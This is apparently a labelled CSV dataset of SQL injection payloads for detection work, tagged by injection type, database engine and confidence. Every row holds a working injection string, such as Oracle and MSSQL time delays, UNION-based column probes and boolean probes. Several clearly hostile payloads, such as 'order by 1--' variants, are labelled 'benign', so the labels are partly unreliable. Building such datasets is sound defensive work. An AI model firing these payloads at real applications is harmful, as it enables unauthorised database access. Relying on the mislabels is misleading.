id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
23601,"1%' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( '%' = '",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
23628,"1' ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
23667,"1%"" ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( ""%"" = """,time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
23771,else dbms_lock.sleep ( 0 ),time_blind,oracle,1.0,"Signals: 'dbms_lock', 'sleep'; Time-blind SQLi (sleep/delay function); DB: oracle",2
23608,"1',iif ( 7475 = 7475,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 28 chars.,2
23617,"1"" ) waitfor delay '0:0:5' and ( ""vjpg"" = ""vjpg",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23624,"1' ) ) as anaq where 9605 = 9605 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
23633,"1"" ) where 8571 = 8571 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
23635,-9809' order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 19 chars.,2
23644,"iif ( 9342 = 6508,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
23675,"1 where 9072 = 9072 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
23682,"-2340%"" order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 19 chars.,2
23697,"-9684"" order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 18 chars.,2
23711,"-8677'|| ( select 'ihpm' from dual where 9571 = 9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
23740,-3304' ) ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 23 chars.,2
23752,"1' ) where 8348 = 8348 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
23753,1 waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23777,-7984' order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 19 chars.,2
23602,1' ) as zmvn where 2887 = 2887 union all select null--,union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
23605,"1' ) ) ) union all select null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 46 chars.,2
23609,"1' ) ) ) union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,2
23610,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
23611,"-5617 ) where 2132 = 2132 union all select 2132,2132,2132,2132#",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
23614,"1"" ) as yzzk where 1813 = 1813 and ( 3020 = 3020 ) *6703--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 58 chars.,2
23616,-7600' or 7684 = 3181#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
23618,-1769 union all select 6054--,union_based,generic,0.7,UNION-based payload detected. Payload length: 29 chars.,2
23623,"-6815 ) where 2498 = 2498 union all select 2498,2498,2498,2498,2498--",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
23627,"1' where 2373 = 2373 union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 48 chars.,2
23630,"-7126' ) ) as fzpp where 8078 = 8078 union all select 8078,8078,8078,8078,8078,8078,8078#",union_based,generic,0.7,UNION-based payload detected. Payload length: 89 chars.,2
23636,"-9008' ) union all select 4976,4976,4976,4976#",union_based,generic,0.7,UNION-based payload detected. Payload length: 46 chars.,2
23639,"1"" ) as hymr where 5497 = 5497 union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
23645,"-5779 ) union all select 6089,6089--",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
23646,-9721' ) or 9287 = 4362#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
23647,1' ) ) ) and 5934 = 2309,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
23648,"1' ) union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,2
23649,"1' where 8437 = 8437 and make_set ( 8403 = 8403,8899 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 57 chars.,2
23652,"-9178 where 2253 = 2253 union all select 2253,2253,2253,2253,2253,2253,2253,2253#",union_based,generic,0.7,UNION-based payload detected. Payload length: 81 chars.,2
23662,"1' ) as wtfo where 5666 = 5666 union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
23663,1' ) ) and 3355 = 6012 and ( ( 'ofmy' = 'ofmy,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 45 chars.,2
23664,"-7579%"" or 6570 = 1764",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
23668,-9562' or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
23671,-3982 ) ) or 6872 = 6872 and ( ( 6331 = 6331,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 44 chars.,2
23672,"1%' ) union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
23674,"1"" ) as jngl where 8384 = 8384 and 4580 = 1718--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
23679,-6202 ) ) or 7845 = 1962--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
23686,"-4093' ) ) union all select 5785,5785,5785#",union_based,generic,0.7,UNION-based payload detected. Payload length: 43 chars.,2
23688,-8181' ) ) or 5926 = 3332#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
23694,"-3902' ) ) ) union all select 3999,3999,3999,3999,3999,3999,3999,3999,3999#",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
23699,-1579%' ) ) ) union all select 7272#,union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
23700,1' in boolean mode ) and 9198 = 9198--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,2
23703,"-8869"" where 3019 = 3019 union all select 3019,3019,3019#",union_based,generic,0.7,UNION-based payload detected. Payload length: 57 chars.,2
23705,"-4876"" ) ) as saug where 2256 = 2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",union_based,generic,0.7,UNION-based payload detected. Payload length: 105 chars.,2
23720,1' in boolean mode ) and 3787 = 7750--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,2
23721,"-2790%"" ) union all select 5070,5070#",union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,2
23724,1' ) and 2564 = 3234--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
23730,"-3952' ) union all select 6644,6644,6644--",union_based,generic,0.7,UNION-based payload detected. Payload length: 42 chars.,2
